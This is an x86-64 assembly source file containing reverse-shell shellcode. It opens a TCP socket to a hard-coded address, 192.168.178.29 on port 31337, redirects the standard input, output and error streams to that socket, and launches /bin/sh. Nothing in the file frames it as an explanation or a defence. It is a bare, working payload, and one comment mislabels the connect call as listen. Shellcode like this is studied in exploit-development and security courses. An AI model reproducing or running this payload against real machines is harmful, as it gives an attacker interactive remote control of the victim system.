BITS 64

global _start
section .text

_start:
	; socket(AF_INET, SOCK_STREAM, 0) -> C
	push BYTE 0x29					; sys_socket systemcall
	pop rax							; is number 41 (0x29)
	push BYTE 0x2
	pop rdi							; IP protocol family
	push BYTE 0x1
	pop rsi							; stream socket
	cdq								; default protocol
	syscall

	xchg rdi,rax					; save and store socket fd in rdi for reuse, clear upper 7 bytes of rax

connect:
	; connect(s, [2, 31337, 192.168.178.29], 16)
	mov al,0x2a						; sys_listen systemcall is number 42 (0x2a)
	xor rdx,rdx
	push rdx						; Push some 0s on the stack
	mov DWORD [rsp+4], 0x1db2a8c0	; SIN_ADDR = 192.168.178.29
	mov WORD [rsp+2], 0x697a		; PORT = 31337 (0x697a)
	mov BYTE [rsp], 0x02			; FAMILY = AF_INET (2)
	push rsp						; pointer to
	pop rsi							; sockaddr structure
	mov BYTE dl,0x10				; addrlen = 16
	syscall

	;inc rax		raise an error if connect
	;cmp rax, 0x1 	didnt return 0 (success) + 9 bytes

	;jne error

	;dup2(s, fd) for stdin, stdout and stderr
	push 0x3
	pop rsi
	
dup_loop:
	dec rsi
	mov al, 0x21
	syscall

	jnz dup_loop

	;execve("/bin/sh", 0, 0)
	push 0x3b
	pop rax							; sys_execve
	xor rdx,rdx
	mov rdi, 0x68732f6e69622f2f		; "hs/nib//"
	shr rdi, 0x8					; "\0hs/nib/"
	push rdi
	push rsp
	pop rdi							; pointer to "/bin/sh"
	syscall

;error:
